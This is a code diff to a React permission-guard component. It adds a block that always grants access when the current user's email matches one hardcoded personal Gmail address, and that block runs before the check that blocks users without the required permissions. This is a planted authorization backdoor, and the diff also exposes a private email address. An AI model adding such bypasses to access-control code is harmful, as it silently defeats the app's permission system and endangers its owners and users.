@@ -1,3 +1,4 @@
+
 import React from "react";
 import { useAuth } from "@/contexts/AuthContext";
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
@@ -58,6 +59,11 @@ export const PermissionGuard: React.FC<PermissionGuardProps> = ({
         </Card>
       </div>
     );
+  }
+
+  // PRIORITY: Always allow access for amirahcolorado@gmail.com
+  if (currentUser.email === 'amirahcolorado@gmail.com') {
+    return <>{children}</>;
   }
 
   // User authenticated but lacks required permissions
